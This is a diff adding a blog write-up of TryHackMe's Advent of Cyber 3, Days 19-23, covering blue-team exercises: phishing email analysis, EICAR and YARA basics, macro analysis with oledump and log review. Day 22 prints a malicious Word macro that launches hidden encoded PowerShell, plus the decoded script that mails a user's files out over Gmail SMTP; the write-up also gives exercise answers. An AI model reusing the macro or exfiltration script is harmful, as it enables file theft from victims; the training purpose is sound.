@@ -1,0 +1,621 @@
+---
+title: TryHackMe – Advent of Cyber 3 – [Days 19-23] 
+author: Kaleb Humpal
+date_created: 2021-12-23
+summary: Writeup for Days 19-23 of Try Hack Me's 3rd Advent of Cyber event, covering the topic of Blue Teaming.
+tags: [cyber security, hacking, tryhackme, offensive security, pentest, penetration testing, pentesting, christmas, event, blue teaming, blue team, defense, defensive security]
+---
+
+## [Day 19] `Blue Teaming` Something Phishy Is Going On
+McSkidy received reports of multiple phishing attempts from various elves. 
+
+One of the elves shared the email that was sent to her, along with the attachment. The email was forwarded as a .eml file, along with the base64 encoded string in a text file. Is Grinch Enterprises up to their shenanigans? 
+
+After reading through the stuff about understanding `#`, `#`, and `#`, and possibly watching [`#`' Video]() 
+
+## Questions 
+To get started, we need to start the Machine and open split view so we have access to the Windows machine in question.
+
+### 1. Who was the email sent to? (Answer is the email address)
+If we open the email desktop application, Thunderbird Mail, we are shown the phishing email.
+<Image wide src="../../static/img/AoC3/Day19-Phishing_Email.png" />
+#### Flag
+We can see that the email was sent to `elfmcphearson@tbfc.com`
+
+### 2. Phishing emails use similar domains of their targets to increase the likelihood the recipient will be tricked into interacting with the email. Who does it say the email was from? (Answer is the email address)
+#### Flag
+We can also see just above, that the email was sent from `customerservice@t8fc.info`
+
+### 3. Sometimes phishing emails have a different reply-to email address. If this email was replied to, what email address will receive the email response?
+#### Flag
+We can also see the reply to email is `fisher@tempmailz.grinch`
+
+### 4. Less sophisticated phishing emails will have typos. What is the misspelled word?
+#### Flag
+If we read through the email, we can see in the second paragraph, the misspelled word is `stright`.
+
+### 5. The email contains a link that will redirect the recipient to a fraudulent website in an effort to collect credentials. What is the link to the credential harvesting website?
+#### Flag
+We can copy the link, it is `https://89xgwsnmo5.grinch/out/fishing/`
+
+### 6. View the email source code. There is an unusual email header. What is the header and its value?
+
+#### Flag
+X-GrinchPhish: >;^)
+
+### 7. You received other reports of phishing attempts from other colleagues. Some of the other emails contained attachments. Open attachment.txt. What is the name of the attachment?
+If we check the folder on the desktop called `Email Artifacts`, we can find the `attachment.txt`
+#### Flag
+the filename="`password-reset-instructions.pdf`""
+
+### 8. What is the flag in the PDF file?
+
+<Image wide src="../../static/img/AoC3/Day19-Q8-pdf_flag.png" />
+
+#### Flag
+`THM{A0C_Thr33_Ph1sh1ng_An4lys!s}`
+
+### 9. If you want to learn more about phishing, check out the "Phishing" module on TryHackMe.
+#### Flag
+`No answer needed`
+
+---
+
+## [Day 20] `Blue Teaming` What's the Worst That Could Happen?
+McPayroll is processing the bonuses for all the hardworking elves. One of the Elves has sent McPayroll a file that they're claiming contains their updated payment information. The only problem is that she doesn't recognize the Elf - could this be a sneaky attack from Grinch Enterprises to cause more havoc? Analyze the file to see if you can determine whether it's malicious or not!
+
+McPayroll provides this file to McSkidy who is a member of the security team. McSkidy is a wise elf. She knows to analyze this file in a sandboxed environment. Therefore, she fired up her [Remnux](https://remnux.org/) VM to take a look at the suspicious file. She unzipped the archive and saw that there was a folder named 'Samples' and a file named 'testfile' in the zip archive. She copied these files over to her Remnux desktop to begin the analysis.
+
+
+After reading through the lesson with these learning objectives:
+1. How to identify the file type of a file regardless of file extension
+2. How to find strings in a file
+3. How to calculate hash of a file
+4. Using VirusTotal to perform preliminary analysis of a suspicious file
+
+`#`, `#`, and `#`, and possibly watching [`Saqib`'s Video](https://www.youtube.com/watch?v=gwBCa1M7w38) 
+
+## Questions 
+
+### 1. Open the terminal and navigate to the file on the desktop named 'testfile'. Using the 'strings' command, check the strings in the file. There is only a single line of output to the 'strings' command. What is the output?
+
+
+#### Flag
+
+### 2. Check the file type of 'testfile' using the 'file' command. What is the file type?
+
+
+
+#### Flag
+
+### 3. Calculate the file's hash and search for it on VirusTotal. When was the file first seen in the wild?
+
+
+
+#### Flag
+
+
+### 4. On VirusTotal's detection tab, what is the classification assigned to the file by Microsoft?
+
+
+
+#### Flag
+
+### 5. Go to [this link](https://www.eicar.org/?page_id=3950) to learn more about this file and what it is used for. What were the first two names of this file?
+
+#### Flag
+
+### 6. The file has 68 characters in the start known as the known string. It can be appended with whitespace characters upto a limited number of characters. What is the maximum number of total characters that can be in the file?
+
+#### Flag
+
+---
+
+## [Day 21] `Blue Teaming` Needles In Computer Stacks
+Grinch Enterprises have been very sneaky this year - using multiple attack vectors (both know and unknown) to wreak havoc across the Best Festival Company. It's 4 days from Christmas and there's still so much work to do! McBlue, the only technical person, has suggested using automation and tooling to detect malicious files across the network. Can you work with him to remove any malicious files from the network?
+
+
+
+After reading through the stuff about understanding `#`, `#`, and `#`, and possibly watching [`SecurityNinja`'s Video](https://youtu.be/L3b6hUkftgg) 
+
+## Questions 
+
+### 1. We changed the text in the string $a as shown in the eicaryara rule we wrote, from X5O to X50, that is, we replaced the letter O with the number 0. The condition for the Yara rule is **$a and $b and $c and $d**. If we are to only make a change to the first boolean operator in this condition, what boolean operator shall we replace the 'and' with, in order for the rule to still hit the file?
+#### Flag
+`or`
+
+### 2. What option is used in the Yara command in order to list down the metadata of the rules that are a hit to a file? 
+#### Flag
+`-m`
+
+### 3. What section contains information about the author of the Yara rule?
+#### Flag
+`metadata`
+
+### 4. What option is used to print only rules that did not hit?
+For this one, in the Machine Split View, we can run `man yara` in the terminal to see what kind of options we have. A little ways down, we can find the `-n` or `--negate` option which has the function to "Print rules that doesn't apply (negate)."
+#### Flag
+`-n`
+
+### 5. Change the Yara rule value for the `$a` string to `X50`. Rerun the command, but this time with the `-c` option. What is the result?
+#### Flag
+`0`
+
+---
+
+## [Day 22] `Blue Teaming` How It Happened
+McSkidy has finally gotten around to identifying the first trace of Grinch Enterprises within their network. They're looking at local machines to determine what exactly they did when they first entered the network. Can you help them make sense of what happened?
+
+
+After reading through the stuff about understanding `#`, `#`, and `#`, and possibly watching [`#`' Video]() 
+
+## Questions 
+I think for this one, instead of just following the instructions and going for `macro stream number 8` and dumping that stream. I will go as if we found the doc file just now and we will now check it out with `oledump` and see what we can get from there.</br>
+
+So, let's move into the directory that has the malicious doc file in it: `cd Desktop\Santa_Claus_Naughty_List_2021`, in there is the doc file called `Santa_Claus_Naughty_List_2021.doc`. </br>
+Now let's run `oledump.py Santa_Claus_Naughty_List_2021.doc` to see what macro streams are inside of it.
+```console
+C:\Users\Administrator\Desktop\Santa_Claus_Naughty_List_2021>oledump.py Santa_Claus_Naughty_List_2021.doc
+1:       114 '\x01CompObj'
+2:      4096 '\x05DocumentSummaryInformation'
+3:      4096 '\x05SummaryInformation'
+4:      7211 '1Table'
+5:    204592 'Data'
+6:        97 'Macros/GrinchEnterprisesWasHere/\x01CompObj'
+7:       318 'Macros/GrinchEnterprisesWasHere/\x03VBFrame'
+8:      1650 'Macros/GrinchEnterprisesWasHere/f'
+9:        84 'Macros/GrinchEnterprisesWasHere/o'
+10:       580 'Macros/PROJECT'
+11:       140 'Macros/PROJECTwm'
+12: M    1879 'Macros/VBA/GrinchEnterprisesWasHere'
+13: M     987 'Macros/VBA/Module1'
+14: m     924 'Macros/VBA/ThisDocument'
+15:      3501 'Macros/VBA/_VBA_PROJECT'
+16:       921 'Macros/VBA/dir'
+17:      4096 'WordDocument'
+```
+
+Okay, I think I'll check each of the streams for something that looks odd using different checks of `-s [stream_number] -S`, `-s [stream_number] -d`, `-s [stream_number] -x`, and `-s [stream_number] -a`, and we'll go from there.
+
+### Stream 1 String Output
+```console
+C:\Users\Administrator\Desktop\Santa_Claus_Naughty_List_2021>oledump.py Santa_Claus_Naughty_List_2021.doc -s 1 -S
+Microsoft Word 97-2003 Document
+MSWordDoc
+Word.Document.8
+```
+
+### Stream 2 String Output
+```console
+C:\Users\Administrator\Desktop\Santa_Claus_Naughty_List_2021>oledump.py Santa_Claus_Naughty_List_2021.doc -s 2 -S
+Title
+```
+
+### Stream 3 String Output
+```console
+C:\Users\Administrator\Desktop\Santa_Claus_Naughty_List_2021>oledump.py Santa_Claus_Naughty_List_2021.doc -s 3 -S
+sales
+Normal
+salesdepartmentx@outlook.com
+Microsoft Office Word
+```
+
+### Stream 4 String Output
+```console
+C:\Users\Administrator\Desktop\Santa_Claus_Naughty_List_2021>oledump.py Santa_Claus_Naughty_List_2021.doc -s 4 -S
+[Content_Types].xml
+rels/.rels
+theme/theme/themeManager.xml
+sQ}#
+theme/theme/theme1.xml
+"GJK
+TcKBc
+v[`E
+'.Lq
+yDQ"Q
+Z6/H
+ud9c
+J{rJ
+Q/B)L
+lC=h
+W!alf
+AXl:X
+PxzSq]y<u
+n6      m
+;B=s!
+q5;3
+BU`M
+b!e9#i
+`571
+W       0xn?G
+theme/theme/_rels/themeManager.xml.rels
+6?$Q
+K(M&$R(.1
+[Content_Types].xmlPK
+_rels/.relsPK
+theme/theme/themeManager.xmlPK
+theme/theme/theme1.xmlPK
+theme/theme/_rels/themeManager.xml.relsPK
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<a:clrMap xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk2" accent1="accent1" accent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>
+Normal
+Default Paragraph Font
+Table Normal
+No List
+Home_Alone.Module1.AutoOpen
+HOME_ALONE.MODULE1.AUTOOPEN
+Unknown
+Times New Roman
+Symbol
+Arial
+Calibri
+Calibri Light
+Cambria Math
+sales
+salesdepartmentx@outlook.com
+```
+
+### Stream 5 Output
+Within the string output of Macro Stream 5 is a lot of data including a photoshop image and lots of jumbled characters in short strings.   
+
+### Stream 6 String Output
+```console
+C:\Users\Administrator\Desktop\Santa_Claus_Naughty_List_2021>oledump.py Santa_Claus_Naughty_List_2021.doc -s 6 -S
+Microsoft Forms 2.0 Form
+Embedded Object
+```
+
+### Stream 7 String Output
+```console
+C:\Users\Administrator\Desktop\Santa_Claus_Naughty_List_2021>oledump.py Santa_Claus_Naughty_List_2021.doc -s 7 -d
+VERSION 5.00
+Begin {C62A69F0-16DC-11CE-9E98-00AA00574A4F} GrinchEnterprisesWasHere
+	Caption         =   "YouFoundGrinchCookie"
+	ClientHeight    =   3015
+	ClientLeft      =   120
+	ClientTop       =   465
+	ClientWidth     =   4560
+	StartUpPosition =   1  'CenterOwner
+	TypeInfoVer     =   4
+End
+```
+
+### Stream 8 String Output
+```console
+C:\Users\Administrator\Desktop\Santa_Claus_Naughty_List_2021>oledump.py Santa_Claus_Naughty_List_2021.doc -s 8 -S
+GrinchEnterprisesIsComingForYou
+ahNtWnl0cVNHa25EeREaT0BaYRNBWmFid3RlVkJ0ZVp1Tk9aenRURGhkSxNHa2FZbEobVUdrR1NHa3FPQEoWSUERE1VBdGVWQnRlWkdOT1p6dFRTamR5VUBKYRBATk8TQnQWTWprcUxCe25EentHT0ARGld5cGFwcnVyS2BETEhHe21PQE4WS0F0dhpqSEdaQnQWSUJgFmVBTXFPQE1hWkJ7bU9AWhdabmdqW3JkR1d6dE9Qb05tVUFwamhpa2FLQBBtEEEQaUhzcGl3cmQWE3p0SEh6ERpXQnQWTUdnYRNua0dWakRMSEAREhNAZW1PQE15T0BKYhpqYGlZQXtxVG9OR1d6dE9Qb05tVUFwamhpZBJZeVpiGmpkFk9HWhJVek5TT3oQckR3TnUTb0gSS0J0VFZ3dGVTQWYST0AQbUt5EXZoYEpxWUF7cVRqZxNEd051EG92GkpCTnVJR2BhbHl7clZ3dGVTQWAWd0F7cVRyEVtTeXQWE2hgcXdBe3FUdhF1WkdOdVpvYGISbGdAU2piTGhpa21XR2tiVnF0Fkt6TltPdhBtUGpnE0Rpa3FaR3R2aGBKcVlBe3FUb0htWnl0cU9BTXFTenRbWWpnE0R3TnUQb3YaSkJOdUlHYGF3RnttE3l0E1Z3TnUTb0gWT0drR1VATldnQE51SHl0FhNCdGVQaGBxEkARdVpBTmVXeXBUSEBkZVlAEEdVQE5yU2BETGhpZBJZeVoWZEBOGldqZxNEak1tS0FNcUtAEGFaeXttT0FNcVl5ZHVQQnt5T0BNT2J5ERJLQnRUVnoRGldqRExoaWQSWXlaFnZBWhZheWRyTGpIR1pCdBZJQmAWZUFNcU9ATWFaQnttT0BaF1puZ2pbcmRHV3p0T1BvTm1VQXBqU2BETEhBe21Nb0hpVXlrSBpqT09VR3tqREBraU9AEXVWR2tuREJkZRF5cGFLQE1pU0dOdUhqcGpoYEpxV0ARQFZ2EHVKQk51SUdgYhpqYGlnQmtpU0AQcVd6e25EdRFPWUJkW1NAEHJKYERMSHlOT1B5e24acRF1E292bUxCdFtIcHtxT0FwYkppZHVWR0lTdXYTdXB2ZWlzcUhPbnF1W3JCdG0TR3tpT0ASW2tATk9WehFEWm5nalt7YGpoYEh5VUBOdUt6EURMaWR5U0FkdkRCdBdEaWR5U0FkdVloclMUYEpxS0drcUt6EUtXeXQWE2pnE0RBTnUQb3QaSkJOdUlHYGF3RnttE3l0E1Z3TnUTb0gSS0J0VFZye3ETenRtTEF0dVZHYGJXcntpTUd0Ek9BTXFuQnttE2pgcU5CdFtPb0h5EkFkW2x6dBJPYEpxV0ARQFZye3ETenRtTEF0dVZHa25WcnRxSGhgcUtHa3FLehFLV3l0FhNockxoRXJMSEAREhNAYBZ3eXQWSGhgcVdAEUBTYEpxS0drcUt6EUtXeXQWE29IcVNAEGFVQBF2TGh3UGhpZBJZeVoWZkJ7bVRBEG1PaGBIFA==
+```
+
+### Stream 9 String Output
+```console
+C:\Users\Administrator\Desktop\Santa_Claus_Naughty_List_2021>oledump.py Santa_Claus_Naughty_List_2021.doc -s 9 -S
+CheckBox1
+Tahoma
+```
+
+### Stream 10 Dump Output
+```console
+C:\Users\Administrator\Desktop\Santa_Claus_Naughty_List_2021>oledump.py Santa_Claus_Naughty_List_2021.doc -s 10 -S
+ID="{5BCF7CF9-AAE3-45C2-B0DB-DE1688298D17}"
+Document=ThisDocument/&H00000000
+Module=Module1
+Package={AC9F2F90-E877-11CE-9F68-00AA00574A4F}
+BaseClass=GrinchEnterprisesWasHere
+Name="Home_Alone"
+HelpContextID="0"
+VersionCompatible32="393222000"
+CMG="5755735AB55EDC62DC62DC62DC62"
+DPB="7A785EBF80C080C080"
+GC="9D9FB9E0FF02000200FD"
+
+[Host Extender Info]
+&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000
+
+[Workspace]
+ThisDocument=102, 287, 1945, 721,
+Module1=18, 221, 1468, 606,
+GrinchEnterprisesWasHere=437, 303, 2280, 737, Z, 52, 52, 1502, 571,
+```
+
+### Stream 11 Dump Output
+```console
+C:\Users\Administrator\Desktop\Santa_Claus_Naughty_List_2021>oledump.py Santa_Claus_Naughty_List_2021.doc -s 11 -d
+ThisDocument T h i s D o c u m e n t   Module1 M o d u l e 1   GrinchEnterprisesWasHere G r i n c h E n t e r p r i s e s W a s H e r e 
+```
+
+### Stream 12 VBA Decompression Output
+```console 
+C:\Users\Administrator\Desktop\Santa_Claus_Naughty_List_2021>oledump.py Santa_Claus_Naughty_List_2021.doc -s 12 -v
+Attribute VB_Name = "GrinchEnterprisesWasHere"
+Attribute VB_Base = "0{E9C0FDDE-A742-4CED-88C5-FDA0674ACF26}{E14290B5-156F-476B-82A8-754921D039F3}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = False
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = False
+Private Sub BADMcSkidy_Click()
+
+End Sub
+
+Private Sub BADMcSkidy_Click()
+
+End Sub
+
+Private Sub BADMcSkidy_Click()
+
+End Sub
+
+Private Sub GrinchEnterprisesIsComingForYou_Click()
+
+End Sub
+
+Private Sub UserForm_Click()
+
+End Sub 
+```
+
+### Stream 13 Output
+```console
+C:\Users\Administrator\Desktop\Santa_Claus_Naughty_List_2021>oledump.py Santa_Claus_Naughty_List_2021.doc -s 13 -v
+Attribute VB_Name = "Module1"
+Sub AutoOpen()
+	Shell "powershell -nop -w hidden -encodedcommand " & GrinchEnterprisesWasHere.ControlTipText
+End Sub
+```
+
+### Stream 14 Output
+```console
+C:\Users\Administrator\Desktop\Santa_Claus_Naughty_List_2021>oledump.py Santa_Claus_Naughty_List_2021.doc -s 14 -v
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True 
+```
+
+
+### Stream 15 Output
+```console
+C:\Users\Administrator\Desktop\Santa_Claus_Naughty_List_2021>oledump.py Santa_Claus_Naughty_List_2021.doc -s 15 -S
+ca|:F
+Word
+Win16
+Win32
+Win64x
+VBA6
+VBA7
+Home_Alone&
+stdole
+Normal
+Office
+MSFormsC
+ThisDocument<
+_Evaluate
+Module1b
+AutoOpen
+ShellV
+GrinchEnterprisesWasHereR'
+ControlTipText8
+BADMcSkidy_Click
+GrinchEnterprisesIsComingForYou_Click
+UserForm_Click
+UserFormN
+GrinchEnterprisesIsComingForYouI
+Documentj
+*\G{000204EF-0000-0000-C000-000000000046}#4.2#9#C:\Program Files (x86)\Common Files\Microsoft Shared\VBA\VBA7.1\VBE7.DLL#Visual Basic For Applications
+*\G{00020905-0000-0000-C000-000000000046}#8.7#0#C:\Program Files (x86)\Microsoft Office\root\Office16\MSWORD.OLB#Microsoft Word 16.0 Object Library
+*\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\Windows\SysWOW64\stdole2.tlb#OLE Automation
+*\CNormal
+*\CNormal
+*\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.8#0#C:\Program Files (x86)\Common Files\Microsoft Shared\OFFICE16\MSO.DLL#Microsoft Office 16.0 Object Library
+*\G{0D452EE1-E08F-101A-852E-02608C4D0BB4}#2.0#0#C:\Windows\SysWOW64\FM20.DLL#Microsoft Forms 2.0 Object Library
+*\G{D267CABC-6B5E-4542-8C9F-D12A8339F5C3}#2.0#0#C:\Users\TESTUS~1\AppData\Local\Temp\VBE\MSForms.exd#Microsoft Forms 2.0 Object Library
+ThisDocument
+01639b8119
+ThisDocument
+Module1
+02639b8119
+Module1
+0GrinchEnterprisesWasHere
+06639b812d
+0GrinchEnterprisesWasHere
+```
+
+### Stream 16 Output
+```console
+C:\Users\Administrator\Desktop\Santa_Claus_Naughty_List_2021>oledump.py Santa_Claus_Naughty_List_2021.doc -s 16 -S
+Home_Alo
+stdole>
+*\G{00
+	020430-
+6}#2.0#0
+#C:\Wind
+ows\SysW OW64\
+tlb#OLE
+Automati
+ENor(mal
+	G{2DF8D0
+	4C-5BFA-
+101B-BDER5
+gProgram
+Files (
+	x86)\Com
+\Mic
+rosoft S
+hared\OF
+FICE16\M
+SO.DLL#
+P 16.0 O
+bject Li`brary
+MSF@Cs
+D452EE1-
+E08F
+1A-8
+-02608C@4D0BB4
+M20L'B
+00}#0
+D267C
+ABC-6B5E
+-4542-8C
+9F-D12A8
+339F5C3H.
+Users\TE
+STUS~1\A
+ppData\L
+ocal\Tem`p\VBE
+ZB/.xexd
+[U4@"
+ThisDo
+cumentG
+DoduPle1G
+Grin
+chEnterp
+risesWas
+HereG
+s qhs
+_q#*((
+stdo
+```
+
+### Stream 17 Output
+```console
+
+```
+
+### 1. What is the username (email address of Grinch Enterprises) from the decoded script?
+So with all of those Streams checked out, we can start to look at individual Streams that seem the most interesting. We can follow the instructions:
+
+*Select the macro stream number 8 and dump the contents by running the command:
+oledump.py -s 8 -d*
+
+*The decimal number 35 will be our XOR key. Let's build the recipe in CyberChef using the following ingredients:*
+
+*1. From Base64*
+*2. XOR 35 (Don't forget to choose Decimal from the dropdown!)*
+
+*You might have noticed the secret script still looks odd because it's double-encoded using Base64! Let's choose From Base64 for our third ingredient.* 
+
+So let's go to cyber chef and build that recipe with the encoded string from Stream 8:
+
+<Image wide src="../../static/img/AoC3/Day22-Q1-CyberChef_Recipe.png" />
+With that recipe and this as input:
+
+```
+ahNtWnl0cVNHa25EeREaT0BaYRNBWmFid3RlVkJ0ZVp1Tk9aenRURGhkSxNHa2FZbEobVUdrR1NHa3FPQEoWSUERE1VBdGVWQnRlWkdOT1p6dFRTamR5VUBKYRBATk8TQnQWTWprcUxCe25EentHT0ARGld5cGFwcnVyS2BETEhHe21PQE4WS0F0dhpqSEdaQnQWSUJgFmVBTXFPQE1hWkJ7bU9AWhdabmdqW3JkR1d6dE9Qb05tVUFwamhpa2FLQBBtEEEQaUhzcGl3cmQWE3p0SEh6ERpXQnQWTUdnYRNua0dWakRMSEAREhNAZW1PQE15T0BKYhpqYGlZQXtxVG9OR1d6dE9Qb05tVUFwamhpZBJZeVpiGmpkFk9HWhJVek5TT3oQckR3TnUTb0gSS0J0VFZ3dGVTQWYST0AQbUt5EXZoYEpxWUF7cVRqZxNEd051EG92GkpCTnVJR2BhbHl7clZ3dGVTQWAWd0F7cVRyEVtTeXQWE2hgcXdBe3FUdhF1WkdOdVpvYGISbGdAU2piTGhpa21XR2tiVnF0Fkt6TltPdhBtUGpnE0Rpa3FaR3R2aGBKcVlBe3FUb0htWnl0cU9BTXFTenRbWWpnE0R3TnUQb3YaSkJOdUlHYGF3RnttE3l0E1Z3TnUTb0gWT0drR1VATldnQE51SHl0FhNCdGVQaGBxEkARdVpBTmVXeXBUSEBkZVlAEEdVQE5yU2BETGhpZBJZeVoWZEBOGldqZxNEak1tS0FNcUtAEGFaeXttT0FNcVl5ZHVQQnt5T0BNT2J5ERJLQnRUVnoRGldqRExoaWQSWXlaFnZBWhZheWRyTGpIR1pCdBZJQmAWZUFNcU9ATWFaQnttT0BaF1puZ2pbcmRHV3p0T1BvTm1VQXBqU2BETEhBe21Nb0hpVXlrSBpqT09VR3tqREBraU9AEXVWR2tuREJkZRF5cGFLQE1pU0dOdUhqcGpoYEpxV0ARQFZ2EHVKQk51SUdgYhpqYGlnQmtpU0AQcVd6e25EdRFPWUJkW1NAEHJKYERMSHlOT1B5e24acRF1E292bUxCdFtIcHtxT0FwYkppZHVWR0lTdXYTdXB2ZWlzcUhPbnF1W3JCdG0TR3tpT0ASW2tATk9WehFEWm5nalt7YGpoYEh5VUBOdUt6EURMaWR5U0FkdkRCdBdEaWR5U0FkdVloclMUYEpxS0drcUt6EUtXeXQWE2pnE0RBTnUQb3QaSkJOdUlHYGF3RnttE3l0E1Z3TnUTb0gSS0J0VFZye3ETenRtTEF0dVZHYGJXcntpTUd0Ek9BTXFuQnttE2pgcU5CdFtPb0h5EkFkW2x6dBJPYEpxV0ARQFZye3ETenRtTEF0dVZHa25WcnRxSGhgcUtHa3FLehFLV3l0FhNockxoRXJMSEAREhNAYBZ3eXQWSGhgcVdAEUBTYEpxS0drcUt6EUtXeXQWE29IcVNAEGFVQBF2TGh3UGhpZBJZeVoWZkJ7bVRBEG1PaGBIFA==
+```
+
+We get the following as output:
+
+```
+#Credits goes to @ManiarViral (https://twitter.com/maniarviral) for writing this awesome RAT!
+
+$username="Grinch.Enterprises.2021@gmail.com"
+$password="S@ntai$comingt0t0wn"
+$smtpServer = "smtp.gmail.com"
+$msg = new-object Net.Mail.MailMessage
+
+$smtp = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 
+
+$smtp.EnableSsl = $true
+
+$smtp.Credentials = New-Object System.Net.NetworkCredential($username,$password)
+
+
+$msg.From = "santaspresentsdelivery@gmail.com"
+
+$msg.To.Add("Grinch.Enterprises.2021@gmail.com")
+
+$msg.Body="Your presents have arrived!"
+
+$msg.Subject = "Christmas Wishlist"
+
+$files=Get-ChildItem "$env:USERPROFILE\Pictures\Grinch2021\"
+
+Foreach($file in $files)
+{
+$attachment = new-object System.Net.Mail.Attachment -ArgumentList $file.FullName
+$msg.Attachments.Add($attachment)
+
+}
+$smtp.Send($msg)
+$attachment.Dispose();
+$msg.Dispose();
+```
+
+#### Flag
+From the output of the encoded string, we can see at the top of the RAT that the username is `Grinch.Enterprises.2021@gmail.com`.
+
+### 2. What is the mailbox password you found?
+
+#### Flag
+`S@ntai$comingt0t0wn`
+
+
+### 3. What is the subject of the email?
+#### Flag
+`Christmas Whishlist`
+
+### 4. What port is the script using to exfiltrate data from the North Pole?
+
+#### Flag
+`587`
+
+### 5. What is the flag hidden found in the document that Grinch Enterprises left behind? (Hint: use the following command oledump.py -s {stream number} -d, the answer will be in the caption).
+
+#### Flag
+`YouFoundGrinchCookie`
+
+### 6. There is still a second flag somewhere... can you find it on the machine?
+Going back to the output, we can see a line with `$files=Get-ChildItem "$env:USERPROFILE\Pictures\Grinch2021\"`, let's go see what is in that folder. Within the `Grinch2021` folder is a `PNG File` called `flag2`.
+#### Flag
+In the image is the flag `S@nt@c1Au$IsrEAl`.
+
+---
+
+## [Day 23] `Blue Teaming` PowershELlF Magic
+One of the administrators with access to the Elf Dome Defense system realized that his password file was missing from his desktop. Without the password, he will not be able to log into the Mission Control panel. McSkidy suspects that perhaps one of the previous phishing attempts was successful. McSkidy jumps into action.
+
+You need to inspect the event logs to determine what has occurred and see if you can retrieve the password from the deleted text file. 
+
+After reading through the stuff about understanding `#`, `#`, and `#`, and possibly watching [`Cybrites`' Video]() 
+
+## Questions 
+
+### 1. What command was executed as Elf McNealy to add a new user to the machine?
+
+#### Flag
+`Invoke-Nightmare`
+
+### 2. What user executed the PowerShell file to send the password.txt file from the administrator's desktop to a remote server?
+
+#### Flag
+`adm1n`
+
+### 3. What was the IP address of the remote server? What was the port used for the remote connection? (format: IP,Port)
+
+#### Flag
+`10.10.148.96,4321`
+
+### 4. What was the encryption key used to encrypt the contents of the text file sent to the remote server?
+
+#### Flag
+`j3pn50vkw21hhurbqmxjlpmo9doiukyb`
+
+### 5. What application was used to delete the password.txt file?
+
+#### Flag
+`sdelete.exe`
+
+### 6. What is the date and timestamp the logs show that password.txt was deleted? (format: MM/DD/YYYY H:MM:SS PM)
+
+#### Flag
+`11/11/2021 7:29:27 PM`
+
+### 7. What were the contents of the deleted password.txt file?
+
+#### Flag
